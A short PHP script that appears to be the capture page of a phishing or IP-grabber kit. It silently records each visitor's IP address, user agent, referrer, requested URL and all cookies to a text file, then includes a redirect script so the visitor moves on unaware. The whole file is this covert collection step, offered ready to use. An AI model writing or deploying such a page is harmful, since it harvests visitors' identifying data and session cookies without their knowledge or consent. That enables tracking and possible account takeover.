<?php
include '../ip.php';
// Get device information
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$remote_addr = $_SERVER['REMOTE_ADDR'];
$request_uri = $_SERVER['REQUEST_URI'];
$server_name = $_SERVER['SERVER_NAME'];
$server_port = $_SERVER['SERVER_PORT'];
$is_https = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off';
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$cookies = print_r($_COOKIE, true);

// Format device information as a string
$info = "User-Agent: $user_agent\n";
$info .= "Remote Address: $remote_addr\n";
$info .= "Requested URI: $request_uri\n";
$info .= "Hostname: $server_name\n";
$info .= "Port: $server_port\n";
$info .= "HTTPS: " . ($is_https ? 'Yes' : 'No') . "\n";
$info .= "Referrer: $referrer\n";
$info .= "Cookies: $cookies\n\n";

// Save device information to a file
$file = 'device-info.txt';
$handle = fopen($file, 'a');
fwrite($handle, $info);
fclose($handle);
include '../redirect.php';
?>
